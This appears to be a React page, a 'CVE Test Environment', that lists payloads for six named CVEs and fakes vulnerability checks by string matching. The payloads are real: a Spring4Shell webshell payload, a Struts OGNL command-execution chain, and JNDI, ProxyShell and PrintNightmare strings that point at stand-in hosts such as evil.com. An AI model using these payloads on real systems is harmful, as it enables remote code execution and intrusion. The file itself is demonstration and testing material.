import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSearchParams } from 'react-router-dom';

// Real CVE examples and their exploit patterns
const VULNERABILITY_TESTS = {
  // Log4Shell (CVE-2021-44228) - Critical RCE vulnerability
  log4shell: {
    payload: '${jndi:ldap://evil.com/exploit}',
    description: 'Log4j JNDI injection vulnerability that allows remote code execution',
    severity: 'CRITICAL (CVSS 10.0)',
    pattern: '${jndi:ldap://[host]/[path]}'
  },

  // Spring4Shell (CVE-2022-22965) - Critical RCE in Spring Framework
  spring4shell: {
    payload: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di',
    description: 'Spring Core RCE through data binding',
    severity: 'CRITICAL (CVSS 9.8)',
    pattern: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern='
  },

  // Apache Struts (CVE-2017-5638) - Critical RCE vulnerability
  strutsCMD: {
    payload: '%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
    description: 'Apache Struts2 Remote Code Execution',
    severity: 'CRITICAL (CVSS 10.0)',
    pattern: '%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}'
  },

  // VMware vCenter (CVE-2021-21972) - Critical RCE vulnerability
  vCenterRCE: {
    payload: '/ui/vropspluginui/rest/services/uploadova',
    description: 'VMware vCenter Server RCE through unauthorized file upload',
    severity: 'CRITICAL (CVSS 9.8)',
    pattern: 'POST /ui/vropspluginui/rest/services/uploadova'
  },

  // ProxyShell (CVE-2021-34473) - Exchange Server RCE
  proxyshell: {
    payload: 'autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com',
    description: 'Microsoft Exchange Server Remote Code Execution',
    severity: 'CRITICAL (CVSS 9.8)',
    pattern: 'autodiscover/autodiscover.json?@[domain]/mapi/nspi/'
  },

  // PrintNightmare (CVE-2021-34527) - Windows Print Spooler RCE
  printNightmare: {
    payload: '\\\\evil\\share\\evil.dll',
    description: 'Windows Print Spooler Remote Code Execution',
    severity: 'CRITICAL (CVSS 8.8)',
    pattern: '\\\\[host]\\[share]\\[file].dll'
  }
};

const Test = () => {
  const [searchParams] = useSearchParams();
  const [selectedVuln, setSelectedVuln] = useState('log4shell');
  const [testResult, setTestResult] = useState('');

  // Simulated vulnerable endpoint handler
  const handleVulnerableRequest = (vulnType, payload) => {
    const vuln = VULNERABILITY_TESTS[vulnType];
    
    switch(vulnType) {
      case 'log4shell':
        // Simulate Log4j processing
        console.log('Processing Log4j input:', payload);
        if (payload.includes('${jndi:')) {
          setTestResult('Vulnerable: JNDI lookup attempted with: ' + payload);
        }
        break;

      case 'spring4shell':
        // Simulate Spring Core processing
        if (payload.includes('class.module.classLoader')) {
          setTestResult('Vulnerable: Malicious class loader manipulation detected');
        }
        break;

      case 'strutsCMD':
        // Simulate Struts OGNL processing
        if (payload.includes('@ognl.OgnlContext')) {
          setTestResult('Vulnerable: OGNL injection detected');
        }
        break;

      case 'vCenterRCE':
        // Simulate vCenter file upload
        if (payload.includes('/ui/vropspluginui/rest/services/uploadova')) {
          setTestResult('Vulnerable: Unauthorized file upload possible');
        }
        break;

      case 'proxyshell':
        // Simulate Exchange autodiscover
        if (payload.includes('autodiscover/autodiscover.json?@')) {
          setTestResult('Vulnerable: ProxyShell exploitation attempted');
        }
        break;

      case 'printNightmare':
        // Simulate Print Spooler
        if (payload.match(/\\\\[^\\]+\\[^\\]+\\[^\\]+\.dll/)) {
          setTestResult('Vulnerable: Remote DLL loading attempted');
        }
        break;
    }
  };

  useEffect(() => {
    // Check for CVE test parameters in URL
    const vulnType = searchParams.get('vuln');
    const payload = searchParams.get('payload');
    
    if (vulnType && payload && VULNERABILITY_TESTS[vulnType]) {
      handleVulnerableRequest(vulnType, decodeURIComponent(payload));
    }
  }, [searchParams]);

  return (
    <div className="container p-4">
      <h1>CVE Test Environment</h1>
      <p className="text-red-500">Warning: This page contains real vulnerability patterns for testing!</p>

      <section className="mb-8">
        <h2>Select Vulnerability to Test</h2>
        <select
          value={selectedVuln}
          onChange={(e) => setSelectedVuln(e.target.value)}
          className="mb-4"
        >
          {Object.entries(VULNERABILITY_TESTS).map(([key, vuln]) => (
            <option key={key} value={key}>
              {key} - {vuln.severity}
            </option>
          ))}
        </select>

        <div className="mb-4">
          <h3>Vulnerability Details</h3>
          <pre className="bg-gray-100 p-4 rounded">
            Description: {VULNERABILITY_TESTS[selectedVuln].description}
            Severity: {VULNERABILITY_TESTS[selectedVuln].severity}
            Pattern: {VULNERABILITY_TESTS[selectedVuln].pattern}
          </pre>
        </div>

        <button
          onClick={() => handleVulnerableRequest(selectedVuln, VULNERABILITY_TESTS[selectedVuln].payload)}
          className="bg-red-500 text-white px-4 py-2 rounded"
        >
          Test Vulnerability
        </button>

        {testResult && (
          <div className="mt-4 p-4 bg-yellow-100 rounded">
            <h3>Test Result:</h3>
            <pre>{testResult}</pre>
          </div>
        )}
      </section>

      <footer className="mt-8 text-sm text-gray-500">
        <p>This page contains real CVE patterns for security testing purposes only.</p>
        <p>All vulnerabilities shown here have been patched in their respective systems.</p>
      </footer>
    </div>
  );
};

export default Test;